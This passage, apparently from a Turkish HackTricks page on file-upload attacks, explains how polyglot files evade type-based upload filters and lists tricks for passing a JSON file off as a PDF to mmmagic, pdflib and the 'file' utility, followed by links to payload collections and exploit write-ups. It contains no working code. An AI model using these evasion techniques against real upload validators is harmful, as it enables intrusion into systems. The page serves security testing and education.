Polyglot dosyaların temel faydası, dosyaları tipe göre tarayan güvenlik önlemlerini aşabilme yetenekleridir. Çeşitli uygulamalarda yaygın uygulama, potansiyel olarak zararlı formatların (ör. JS, PHP veya Phar dosyaları) oluşturduğu riski azaltmak için yalnızca JPEG, GIF veya DOC gibi belirli dosya türlerine izin vermektir. Ancak bir polyglot, birden fazla dosya türünün yapısal kriterlerine uyarak bu kısıtlamaları gizlice atlatabilir.

Uyarlanabilirliklerine rağmen polyglotlar sınırlamalarla karşılaşır. Örneğin, bir polyglot aynı anda PHAR dosyası (PHp ARchive) ve JPEG'i temsil ediyor olsa bile, yükleme başarısı platformun dosya uzantısı politikalarına bağlı olabilir. Sistem izin verilen uzantılar konusunda katıysa, bir polyglotun yalnızca yapısal ikiliği yüklemenin garantisi olmayabilir.

### Geçerli JSON'ları sanki PDF imiş gibi yükleme

Bir PDF dosyası taklidi yaparak, izin verilmemiş olsa bile geçerli bir JSON dosyası yükleyerek dosya türü tespitlerinden nasıl kaçınılacağı (teknikler **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**'ten alınmıştır):

- **`mmmagic` library**: İlk 1024 bayt içinde `%PDF` magic baytları olduğu sürece geçerlidir (örneği gönderiden alın)
- **`pdflib` library**: JSON içindeki bir alana sahte bir PDF formatı ekleyin, böylece kütüphane bunun bir pdf olduğunu düşünsün (örneği gönderiden alın)
- **`file` binary**: Bir dosyadan 1048576 bayta kadar okuyabilir. Bu yüzden içeriği bir json olarak analiz edememesi için bu boyuttan daha büyük bir JSON oluşturun ve sonra JSON içine gerçek bir PDF'in başlangıç kısmını koyun; kütüphane bunun bir PDF olduğunu düşünecektir

## References

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Microsoft – mklink (command reference)](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

{{#include ../../banners/hacktricks-training.md}}
